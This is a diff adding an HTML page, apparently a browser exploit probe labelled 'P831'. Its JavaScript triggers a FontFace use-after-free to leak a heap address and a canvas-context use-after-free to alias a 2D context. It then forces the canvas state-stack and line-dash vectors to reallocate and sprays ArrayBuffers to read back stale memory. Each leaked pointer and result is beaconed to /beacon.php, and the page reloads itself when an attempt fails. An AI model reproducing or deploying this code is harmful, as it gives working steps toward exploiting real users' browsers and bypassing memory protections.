@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P831: m_stateStack Vector Realloc Pointer Leak</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P831: m_stateStack realloc pointer leak probe</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P831-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+
+bn('BOOT','start');
+
+/* ===== FontFace UAF -> H ===== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz);
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+  var fontDV=new DataView(fabs[bestI]);
+  var q11lo=fontDV.getUint32(0x58,true),q11hi=fontDV.getUint32(0x5C,true);
+  if(q11hi===0){bn('BAD','');setTimeout(function(){location.reload();},300);return;}
+  var borrow=(q11lo<0x68)?1:0;
+  var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
+  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+  bn('HEAP-OK','H='+Hstr);
+  log('H = '+Hstr,'ok');
+
+  /* ===== Canvas UAF + same-type alias ===== */
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){innerCtx=canvas.getContext('2d');return true;}
+  });
+  canvas.getContext('bitmaprenderer',opts);
+  if(!innerCtx){bn('UAF-FAIL','');setTimeout(function(){location.reload();},300);return;}
+
+  var sprays=[];
+  for(var i=0;i<200;i++){
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    sprays.push({c:c2,ctx:c2.getContext('2d')});
+  }
+
+  var aliasIdx=-1;
+  for(var i=0;i<sprays.length;i++){
+    sprays[i].ctx.lineWidth=1000+i;
+    var v;try{v=innerCtx.lineWidth;}catch(e){v=-1;}
+    if(v===1000+i){aliasIdx=i;break;}
+    sprays[i].ctx.lineWidth=1;
+  }
+  if(aliasIdx<0){bn('NO-ALIAS','');setTimeout(function(){location.reload();},300);return;}
+
+  var sprayCtx=sprays[aliasIdx].ctx;
+  sprayCtx.lineWidth=1;
+  bn('ALIAS-OK','idx='+aliasIdx);
+  log('Alias at spray['+aliasIdx+']','ok');
+
+  /* ===== PHASE A: Measure sizeof(State) ===== */
+  /* save() N times, each time set lineWidth to unique marker.
+     The m_stateStack Vector<State> grows. We can detect realloc
+     by seeing if old values survive (they should — Vector copies on realloc).
+     The key question: what size buffers get freed? */
+
+  /* Create a gradient to put a C++ pointer in every State entry */
+  var grad=sprayCtx.createLinearGradient(0,0,100,100);
+  grad.addColorStop(0,'#FF0000');
+  grad.addColorStop(1,'#0000FF');
+  sprayCtx.fillStyle=grad;
+
+  /* Also set a lineDash so each State has a Vector<double> with a heap pointer */
+  sprayCtx.setLineDash([1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8]);
+
+  /* ===== PHASE B: Small realloc test (8 → 16 entries) ===== */
+  /* Push 8 save()s, then 8 more to trigger first realloc.
+     Freed buffer size ~ 8 * sizeof(State). */
+  for(var s=0;s<8;s++){
+    sprayCtx.save();
+    sprayCtx.lineWidth=5000+s;
+  }
+  /* Verify stack works via alias */
+  var check8;
+  try{check8=innerCtx.lineWidth;}catch(e){check8=-1;}
+  bn('STACK8','lw='+check8);
+
+  /* Push 8 more → should trigger Vector realloc from cap~8 to cap~16 */
+  for(var s=0;s<8;s++){
+    sprayCtx.save();
+    sprayCtx.lineWidth=6000+s;
+  }
+  var check16;
+  try{check16=innerCtx.lineWidth;}catch(e){check16=-1;}
+  bn('STACK16','lw='+check16);
+
+  /* Now try to reclaim the freed ~8*sizeof(State) buffer.
+     sizeof(State) is ~464B, so freed buffer is ~3712B.
+     Try AB sizes near that. */
+  var smallSizes=[3200,3456,3584,3712,3840,3968,4096,4608,5120];
+  var smallHits=[];
+  for(var si=0;si<smallSizes.length;si++){
+    var sz=smallSizes[si];
+    var abs8=[];
+    for(var a=0;a<20;a++)abs8.push(new ArrayBuffer(sz));
+    var bestNzA=0,bestNzI=-1;
+    for(var a=0;a<20;a++){
+      var bu=new BigUint64Array(abs8[a]);
+      var nz=0;
+      for(var q=0;q<bu.length;q++){if(bu[q]!==0n)nz++;}
+      if(nz>bestNzA){bestNzA=nz;bestNzI=a;}
+    }
+    if(bestNzA>0){
+      smallHits.push(sz+'B:'+bestNzA+'nz');
+      /* Read first 8 non-zero qwords */
+      var bu=new BigUint64Array(abs8[bestNzI]);
+      var vals=[];
+      for(var q=0;q<bu.length&&vals.length<8;q++){
+        if(bu[q]!==0n)vals.push(q+':0x'+bu[q].toString(16));
+      }
+      bn('SMALL-HIT','sz='+sz+'|nz='+bestNzA+'|vals='+vals.join(','));
+      log('SMALL HIT sz='+sz+': '+bestNzA+' nz qwords','hot');
+      log('  '+vals.join(' '),'hot');
+    }
+  }
+  if(smallHits.length===0){
+    bn('SMALL-CLEAN','all zero');
+    log('Small realloc: all ABs zero-init ('+smallSizes.join(',')+'B)','info');
+  }
+
+  /* Restore all 16 saves */
+  for(var r=0;r<16;r++){try{sprayCtx.restore();}catch(e){break;}}
+
+  /* ===== PHASE C: Large realloc test (128 → 256 entries) ===== */
+  /* Re-set gradient+lineDash for fresh State entries */
+  sprayCtx.fillStyle=grad;
+  sprayCtx.setLineDash([1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8]);
+
+  /* Push 128 save()s */
+  for(var s=0;s<128;s++){
+    sprayCtx.save();
+    sprayCtx.lineWidth=7000+s;
+  }
+  bn('STACK128','done');
+
+  /* Push 128 more → realloc from ~128 to ~256, freeing ~128*464 = ~59392B */
+  for(var s=0;s<128;s++){
+    sprayCtx.save();
+    sprayCtx.lineWidth=8000+s;
+  }
+  bn('STACK256','done');
+
+  /* Try to reclaim freed ~59KB buffer */
+  var largeSizes=[55000,57000,58000,59000,59392,60000,61000,62000,64000];
+  var largeHits=[];
+  for(var li=0;li<largeSizes.length;li++){
+    var sz=largeSizes[li];
+    var absL=[];
+    for(var a=0;a<10;a++)absL.push(new ArrayBuffer(sz));
+    var bestNzL=0,bestNzLI=-1;
+    for(var a=0;a<10;a++){
+      var bu=new BigUint64Array(absL[a]);
+      var nz=0;
+      for(var q=0;q<bu.length;q++){if(bu[q]!==0n)nz++;}
+      if(nz>bestNzL){bestNzL=nz;bestNzLI=a;}
+    }
+    if(bestNzL>0){
+      largeHits.push(sz+'B:'+bestNzL+'nz');
+      var bu=new BigUint64Array(absL[bestNzLI]);
+      var vals=[];
+      for(var q=0;q<bu.length&&vals.length<12;q++){
+        if(bu[q]!==0n)vals.push(q+':0x'+bu[q].toString(16));
+      }
+      bn('LARGE-HIT','sz='+sz+'|nz='+bestNzL+'|vals='+vals.join(','));
+      log('LARGE HIT sz='+sz+': '+bestNzL+' nz qwords','hot');
+      log('  '+vals.slice(0,6).join(' '),'hot');
+      if(vals.length>6)log('  '+vals.slice(6).join(' '),'hot');
+    }
+  }
+  if(largeHits.length===0){
+    bn('LARGE-CLEAN','all zero');
+    log('Large realloc: all ABs zero-init','info');
+  }
+
+  /* Restore all 256 saves */
+  for(var r=0;r<256;r++){try{sprayCtx.restore();}catch(e){break;}}
+
+  /* ===== PHASE D: Very large realloc (512 → 1024 entries, ~238KB freed) ===== */
+  sprayCtx.fillStyle=grad;
+  sprayCtx.setLineDash([1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8]);
+
+  for(var s=0;s<512;s++){
+    sprayCtx.save();
+    sprayCtx.lineWidth=9000+(s%1000);
+  }
+  bn('STACK512','done');
+
+  for(var s=0;s<512;s++){
+    sprayCtx.save();
+    sprayCtx.lineWidth=10000+(s%1000);
+  }
+  bn('STACK1024','done');
+
+  /* Freed buffer is ~512*464 = ~237568B. Try huge ABs */
+  var hugeSizes=[230000,235000,237568,240000,245000,250000];
+  var hugeHits=[];
+  for(var hi=0;hi<hugeSizes.length;hi++){
+    var sz=hugeSizes[hi];
+    var absH=[];
+    for(var a=0;a<5;a++)absH.push(new ArrayBuffer(sz));
+    var bestNzH=0,bestNzHI=-1;
+    for(var a=0;a<5;a++){
+      var bu=new BigUint64Array(absH[a]);
+      var nz=0;
+      for(var q=0;q<bu.length;q++){if(bu[q]!==0n)nz++;}
+      if(nz>bestNzH){bestNzH=nz;bestNzHI=a;}
+    }
+    if(bestNzH>0){
+      hugeHits.push(sz+'B:'+bestNzH+'nz');
+      var bu=new BigUint64Array(absH[bestNzHI]);
+      var vals=[],ptrs=[];
+      for(var q=0;q<bu.length&&vals.length<16;q++){
+        if(bu[q]!==0n){
+          vals.push(q+':0x'+bu[q].toString(16));
+          var hi64=Number(bu[q]>>32n);
+          if(hi64>=0x100&&hi64<0x800)ptrs.push(q+':0x'+bu[q].toString(16));
+        }
+      }
+      bn('HUGE-HIT','sz='+sz+'|nz='+bestNzH+'|ptrs='+ptrs.length+'|vals='+vals.slice(0,8).join(','));
+      log('HUGE HIT sz='+sz+': '+bestNzH+' nz, '+ptrs.length+' heap-shaped','hot');
+      log('  '+vals.slice(0,8).join(' '),'hot');
+    }
+  }
+  if(hugeHits.length===0){
+    bn('HUGE-CLEAN','all zero');
+    log('Huge realloc: all ABs zero-init','info');
+  }
+
+  /* Restore all 1024 saves */
+  for(var r=0;r<1024;r++){try{sprayCtx.restore();}catch(e){break;}}
+
+  /* ===== PHASE E: Alternative — lineDash buffer realloc ===== */
+  /* setLineDash allocates Vector<double>. If we grow it and trigger realloc,
+     the freed buffer might contain stale doubles from the old lineDash,
+     which we could detect in a new AB at that size. */
+  var dashSmall=[];
+  for(var d=0;d<32;d++)dashSmall.push(99.99+d);
+  sprayCtx.setLineDash(dashSmall);
+
+  /* Grow to 256 doubles → reallocs, frees old 32*8=256B buffer */
+  var dashBig=[];
+  for(var d=0;d<256;d++)dashBig.push(77.77+d);
+  sprayCtx.setLineDash(dashBig);
+
+  /* Try to reclaim freed 256B with AB */
+  var dashABs=[];
+  for(var a=0;a<50;a++)dashABs.push(new ArrayBuffer(256));
+  var dashHit=0;
+  for(var a=0;a<50;a++){
+    var dv=new Float64Array(dashABs[a]);
+    for(var d=0;d<dv.length;d++){
+      if(dv[d]!==0){dashHit++;break;}
+    }
+  }
+  bn('DASH-REALLOC','hit='+dashHit+'/50');
+  log('Dash realloc residual: '+dashHit+'/50 ABs with nonzero doubles','info');
+
+  /* ===== DONE ===== */
+  var summary='smallH='+smallHits.length+'|largeH='+largeHits.length+'|hugeH='+hugeHits.length+'|dashH='+dashHit+'|H='+Hstr;
+  bn('DONE',summary);
+  log('','');
+  log('P831 COMPLETE','hot');
+
+},600);
+</script></body></html>
